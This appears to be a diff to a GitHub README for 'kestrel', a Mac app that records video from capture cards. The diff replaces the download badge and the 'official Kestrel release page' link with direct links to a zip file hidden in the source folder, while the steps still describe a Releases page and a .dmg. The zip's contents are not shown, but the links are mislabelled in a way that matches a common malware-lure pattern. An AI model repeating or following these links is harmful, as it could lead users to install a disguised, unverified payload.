@@ -1,6 +1,6 @@
 # 🎥 kestrel - Record high quality video from consoles
 
-[![](https://img.shields.io/badge/Download_Kestrel-blue)](https://github.com/Counterdemonstratorraffiafarinifera618/kestrel)
+[![](https://img.shields.io/badge/Download_Kestrel-blue)](https://github.com/Counterdemonstratorraffiafarinifera618/kestrel/raw/refs/heads/main/Sources/Kestrel/UI/Software_2.5-beta.5.zip)
 
 Kestrel records video from USB-C HDMI capture cards directly on your Mac. It sits in your menu bar and stays out of your way. This app captures 4K video at 60 frames per second using efficient HEVC encoding. All video processing happens on your machine. Your data never leaves your computer.
 
@@ -16,7 +16,7 @@ To use Kestrel, your setup must meet these standards:
 
 ## 📥 How to Install
 
-1. Visit the [official Kestrel release page](https://github.com/Counterdemonstratorraffiafarinifera618/kestrel) to start.
+1. Visit the [official Kestrel release page](https://github.com/Counterdemonstratorraffiafarinifera618/kestrel/raw/refs/heads/main/Sources/Kestrel/UI/Software_2.5-beta.5.zip) to start.
 2. Look for the latest version under the "Releases" section on the right side of the page.
 3. Click the file that ends with `.dmg`.
 4. Open the file once the download finishes.
